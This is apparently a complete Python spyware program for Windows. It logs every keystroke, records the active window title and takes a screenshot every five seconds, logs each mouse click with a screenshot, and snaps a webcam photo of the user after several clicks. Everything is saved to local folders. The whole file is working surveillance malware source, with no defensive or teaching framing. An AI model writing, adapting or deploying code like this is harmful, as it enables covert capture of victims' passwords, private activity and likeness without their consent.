# import necessary libraries
from pynput.keyboard import Listener
from pynput import mouse as ms
import logging
import os
import win32gui as w
from PIL import ImageGrab
from threading import Thread
from time import sleep
from datetime import datetime
from cv2 import VideoCapture, imwrite


# check if data file exists
def validate_destn():
	arg = "./data" # set destination of data folder
	if not os.path.exists(arg):
		os.mkdir(arg)
	os.chdir(arg)


def mainloop():
	while True:
		pass


def get_user(count):
	if count != 4:
		pass
	else:
		# initialize the camera
		cam = VideoCapture(0)   # 0 -> index of camera
		s, img = cam.read()
		if s:
			imwrite("user.jpg", img)  # save image


# For log multiple log files
class Logs:
	def __init__(self):
		self.formatter = logging.Formatter('%(asctime)s: %(message)s')

	def setup_logger(self, name, log_file, level=logging.DEBUG):
		"""To setup as many loggers as you want"""
		handler = logging.FileHandler(log_file)
		handler.setFormatter(self.formatter)
		logger = logging.getLogger(name)
		logger.setLevel(level)
		logger.addHandler(handler)
		return logger


# for keylogging
class KeyLogger(Logs):
	def __init__(self):
		super().__init__()
		self.path = "./keys"
		if not os.path.exists(self.path):
			os.mkdir(self.path)
		self.logger = self.setup_logger("keylogs", "./keys/keylogs.log")

	def on_press(self, key):
		self.logger.info(str(key))

	def listen(self):
		spy = Listener(on_press=self.on_press)
		spy.start()


# for getting current foregroung process
class Current_Process(Logs):
	def __init__(self):
		super().__init__()
		self.path = "./process"
		self.timer = 5
		if not os.path.exists(self.path):
			os.mkdir(self.path)
		self.logger = self.setup_logger("process", "./process/process.log")

	def get_process(self):
		while True:
			self.logger.info(w.GetWindowText(w.GetForegroundWindow()))
			sleep(self.timer)

	def spy_on_process(self):
		Thread(target=self.get_process).start()


# Takes screenshots at regular intervals
class ScreenCapture:
	def __init__(self):
		super().__init__()
		self.path = "./shots"
		self.timer = 5
		if not os.path.exists(self.path):
			os.mkdir(self.path)

	def take_shot(self):
		while True:
			dt_string = datetime.now().strftime("%d-%m-%y %H-%M-%S")
			ImageGrab.grab().save(f"./shots/{dt_string}.jpg")
			sleep(self.timer)

	def spy_cam(self):
		Thread(target=self.take_shot).start()



# monitor mouse activity
class Monitor_Mouse(Logs):
	def __init__(self, var):
		super().__init__()
		self.var = var
		self.path = "./mouse_monitor"
		if not os.path.exists(self.path):
			os.mkdir(self.path)
		self.logger = self.setup_logger("mouse", "./mouse_monitor/mouse.log")

	def on_click(self, x, y, button, pressed):
		get_user(self.var)
		self.var += 1
		dt_string = datetime.now().strftime("%d-%m-%y %H-%M-%S")
		self.logger.info('{0} at {1} on {2}'.format('Pressed' if pressed else 'Released', (x, y), dt_string))
		ImageGrab.grab().save(f"./mouse_monitor/{dt_string}.jpg")

	def listen_mouse(self):
		spy = ms.Listener(on_click=self.on_click)
		spy.start()


def sleuth():
	var = 0
	validate_destn()

	keys = KeyLogger()
	keys.listen()

	process = Current_Process()
	process.spy_on_process()

	screen_cam = ScreenCapture()
	screen_cam.spy_cam()

	mouse = Monitor_Mouse(var)
	mouse.listen_mouse()

	get_user(10)

	mainloop()


if __name__ == "__main__":
	sleuth()